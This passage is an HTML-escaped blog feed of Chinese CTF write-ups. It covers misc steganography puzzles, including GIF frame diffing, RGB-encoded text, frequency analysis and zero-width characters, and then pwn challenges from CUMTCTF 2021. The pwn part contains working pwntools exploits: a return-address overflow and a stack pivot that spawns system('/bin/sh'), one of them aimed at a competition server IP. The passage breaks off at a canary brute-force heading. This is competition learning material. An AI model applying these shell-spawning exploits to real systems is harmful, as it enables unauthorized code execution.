&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path = &lt;span class=&#34;string&#34;&gt;&amp;quot;Just_a_GIF/&amp;quot;&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;#填自己的路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    picn = Image.new(&lt;span class=&#34;string&#34;&gt;&amp;quot;RGB&amp;quot;&lt;/span&gt;,(&lt;span class=&#34;number&#34;&gt;119&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;83&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;41&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p1=Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(path+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;.png&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p2=Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(path+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i+j*&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;.png&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; w &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;119&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; h &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;83&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; p1.getpixel((w,h)) != p2.getpixel((w,h)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    picn.putpixel((w,h),(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    picn.save(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;.png&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 然后就拿到 11 张图片 ↓&lt;br /&gt;
&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a48b444.png&#34; alt=&#34;请添加图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;手动拼接？	↓&lt;br /&gt;
&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a4d72e5.png&#34; alt=&#34;请添加图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;网上搜一下，貌似是 DataMatrix，扫出 flag&lt;/p&gt;
&lt;blockquote 6bb73086aeb764b5727529d82b084cce=&#34;&#34;&gt;
&lt;p&gt;DASCTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;misc-nuclear-wastewater&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-nuclear-wastewater&#34;&gt;#&lt;/a&gt; Misc-Nuclear wastewater&lt;/h2&gt;
&lt;p&gt;『赛后复现』彩色的二维码，比赛最后经队友提示，看了看它 RGB 才有了思路。&lt;br /&gt;
所有的色块竟然都是，三个通道两个为 0，剩一个有值，那肯定密码就藏在这里了。&lt;br /&gt;
写个脚本把数字转出来&lt;br /&gt;
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; PIL &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Image&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;img = Image.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Nuclear wastewater.png&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;230&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; t &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;230&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            rgb=&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;(img.getpixel((t,j)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; rgb[i]&amp;gt;&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; rgb[i]&amp;lt;&lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(rgb[i]),end=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 得到这个&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ys&amp;gt;UEJht#?ppeEFtstR#&lt;sub&gt;:hi&lt;/sub&gt;tR:@s@YRteK#e@KsR&amp;amp;E&amp;amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;amp;&amp;amp;::EsEEei#/iYe#/ieKKt//iKYhh&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;发现很多重复的字符，想到使用词频分析看一下&lt;br /&gt;
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; collections &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Counter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f = &lt;span class=&#34;string&#34;&gt;&amp;#x27;Ys&amp;gt;UEJht#?ppeEFtstR#~:hi~tR:@s@YRteK#e@KsR&amp;amp;E&amp;amp;:eR:Eht/#iKtteYKhYKYhhhihhKtC2tt:HVEesY&amp;amp;#@Rj!seRi:eitEtKsetKtEE:hh#h#eYKYihhYK(Kt@iSY$KY/@pRsEetsip:~h@eeEs!E&amp;amp;&amp;amp;::EsEEei#/iYe#/ieKKt//iKYhh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(Counter(f))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a570599.png&#34; alt=&#34;请添加图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;得到： &lt;code&gt;theKEYis:#R@/&amp;amp;p~!&amp;gt;UJ?FC2HVj(S$&lt;/code&gt; &lt;br /&gt;
 初步尝试，发现这个不太对，密码错误。。。&lt;br /&gt;
瞻仰一波套神的 wp 之后，原来  &lt;code&gt;&amp;gt;UJ?FC2HVj(S$&lt;/code&gt;  词频为 1，所以顺序可能出错，推测词频为 1 的部分不是密码，&lt;br /&gt;
所以得到密码：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&#39;#R@/&amp;amp;p~!&#39;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;解压得到 flag.txt....	(T_T)&lt;br /&gt;
 果然我还是太天真了，还以为能直接拿到 flag...&lt;br /&gt;
 瞅瞅内码，然后看到了这个：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a60a7f6.png&#34; alt=&#34;请添加图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;哦吼，还有个零宽？&lt;br /&gt;
包含 U+200C U+200D U+200E，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8zMzBrLmdpdGh1Yi5pby9taXNjX3Rvb2xzL3VuaWNvZGVfc3RlZ2Fub2dyYXBoeS5odG1s&#34;&gt;网址&lt;/span&gt;&lt;br /&gt;
隐藏内容是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;2021 年 4 月 13 日，核废水在 Citrix 县的 CTX1 市尤为严重&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;好吧，完全不知道....(；′⌒`)&lt;br /&gt;
 搜了一下 Citrix CTX1，大概是某种加密，&lt;br /&gt;
终归还是了解的太少了&lt;br /&gt;
&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a6921a9.png&#34; alt=&#34;请添加图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;emm... 搜索发现 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nY2hxLmdpdGh1Yi5pby9DeWJlckNoZWYv&#34;&gt;CyberChef&lt;/span&gt; 可以进行解密	§(&lt;em&gt;￣▽￣&lt;/em&gt;)§&lt;br /&gt;
 解两次得到 flag：&lt;/p&gt;
&lt;blockquote 98047de9ce5aaa4c0031fb55e9dfac70=&#34;&#34;&gt;
&lt;p&gt;flag&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;到这里，misc 就结束啦！ (oﾟvﾟ) ノ&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/</guid>
            <title>CUMTCTF 2021国庆赛WP（部分）</title>
            <link>https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/</link>
            <category>Python</category>
            <category>CTF</category>
            <category>Misc</category>
            <category>Pwn</category>
            <pubDate>Tue, 23 Nov 2021 02:44:13 +1100</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;pwn&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn&#34;&gt;#&lt;/a&gt; PWN&lt;/h2&gt;
&lt;h3 id=&#34;pwn1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn1&#34;&gt;#&lt;/a&gt; pwn1&lt;/h3&gt;
&lt;p&gt;nc 连上 直接 cat flag&lt;/p&gt;
&lt;h3 id=&#34;pwn2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn2&#34;&gt;#&lt;/a&gt; pwn2&lt;/h3&gt;
&lt;p&gt;经典栈溢出&lt;br /&gt;
&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682435298/Typera/2023/04/2d25d53292a7b5602fd11b9e1127bcf1.png&#34; alt=&#34;image-20230425230815230&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=process(&amp;quot;./pwn2&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1.15.81.218&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10001&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;72&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x400596&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;直接传就行了...&lt;/p&gt;
&lt;h3 id=&#34;pwn3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn3&#34;&gt;#&lt;/a&gt; pwn3&lt;/h3&gt;
&lt;p&gt;开了 NX 保护，没开金丝雀&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682435393/Typera/2023/04/0ac847eebeec27d62e811700f99b5b71.png&#34; alt=&#34;image-20230425230949625&#34; /&gt; 有个 echo flag，感觉像是那么回事，实际上没用，&lt;/p&gt;
&lt;p&gt;所以还是得通过 system 函数来搞&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682435314/Typera/2023/04/b3a274b13eede296b71c54165bc95d53.png&#34; alt=&#34;image-20230425230831039&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里 s 大小是 0x28，所以只能溢出 0x8 字节，不够写太长的，但是这里可以读两次，所以思路是第一次泄露 ebp 地址，第二次写入 system (‘/bin/sh’)，然后用 leave;ret 栈劫持 s，执行 system (&#39;/bin/sh&#39;)&lt;/p&gt;
&lt;p&gt;要劫持 s 要知道 s 的地址，可以通过动调知道 ebp 到 s 的距离，然后计算&lt;/p&gt;
&lt;p&gt;ebp 到 s 的距离为 0xffffc1f8 - 0xffffc1c0 = 0x38&lt;/p&gt;
&lt;p&gt;所以 ebp:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;p = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x27&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.send(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ebp = u32(r.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以得到 ebp 的地址，然后 - 0x38 得到 s&lt;/p&gt;
&lt;p&gt;完整 exp:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=remote(&amp;#x27;1.15.81.218&amp;#x27;,10002)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_addr=&lt;span class=&#34;number&#34;&gt;0x8048400&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret=&lt;span class=&#34;number&#34;&gt;0x08048562&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_addr=&lt;span class=&#34;number&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x27&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.send(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s_addr=ebp=u32(r.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x38&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;# ebp-s=0x38&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(s_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p2=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;+p32(sys_addr)+p32(main_addr)+p32(s_addr+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p2=p2.ljust(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# /bin/sh添上\x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p2+=p32(s_addr)+p32(leave_ret)  &lt;span class=&#34;comment&#34;&gt;# hijack s&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.send(p2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;brute&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#brute&#34;&gt;#&lt;/a&gt; brute?&lt;/h3&gt;
&lt;p&gt;brute canary, 暴力破解金丝雀&lt;br /&gt;
